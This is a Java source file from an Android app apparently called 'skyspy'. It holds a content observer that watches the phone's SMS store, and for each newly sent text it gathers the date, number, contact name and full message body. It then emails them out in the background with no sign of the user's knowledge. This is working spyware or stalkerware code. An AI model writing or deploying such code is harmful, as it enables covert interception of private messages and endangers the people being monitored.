package com.example.skyspy.app.sms;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Handler;

import com.example.skyspy.app.email.EmailHelper;

public class SmsSentObserver extends ContentObserver {

    private static final Uri STATUS_URI = Uri.parse("content://sms");
    private static String mPreviousId = "";

    private Context mContext;

    public SmsSentObserver(Handler handler, Context ctx) {
        super(handler);
        mContext = ctx;
    }

    public boolean deliverSelfNotifications() {
        return true;
    }

    public void onChange(boolean selfChange) {
        String sms = "";
        try{
            Cursor cur = mContext.getContentResolver().query(STATUS_URI, null, null, null, null);
            if (cur != null) {
                if (cur.moveToFirst()) {
                    String type = SmsHelper.getSmsTypeName(cur.getInt(cur.getColumnIndexOrThrow("type")));
                    String id = cur.getString(cur.getColumnIndexOrThrow("_id"));
                    if (type.equals(SmsHelper.SENT) && !id.equals(mPreviousId)) {
                        mPreviousId = id;
                        String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                        sms += "Date: "+SmsHelper.convertDate(cur.getLong(cur.getColumnIndexOrThrow("date")))+"\n";
                        sms += "Type: "+type+"\n";
                        if (number != null) {
                            sms += "Number: "+number+"\n";
                        } else {
                            number = SmsHelper.getNumber(cur.getString(cur.getColumnIndexOrThrow("thread_id")), mContext);
                            sms += "Number: "+number+"\n";
                        }
                        sms += "Name: "+SmsHelper.getContactName(number, mContext)+"\n";
                        sms += "Body: "+SmsHelper.removeNewLine(cur.getString(cur.getColumnIndexOrThrow("body")))+"\n";
                        sms += "_______________"+"\n\n";
                    }
                    if (!sms.equals("")) {
                        new AsyncTask<String,Void,Void>() {
                            @Override
                            protected Void doInBackground(String... params) {
                                String letter = params[0];
                                EmailHelper.trySending(letter, mContext);
                                return null;
                            }
                        }.execute(sms);
                    }
                }
            }
            cur.close();
        }
        catch(Exception sggh){
            sggh.printStackTrace();
        }
        super.onChange(selfChange);
    }
}
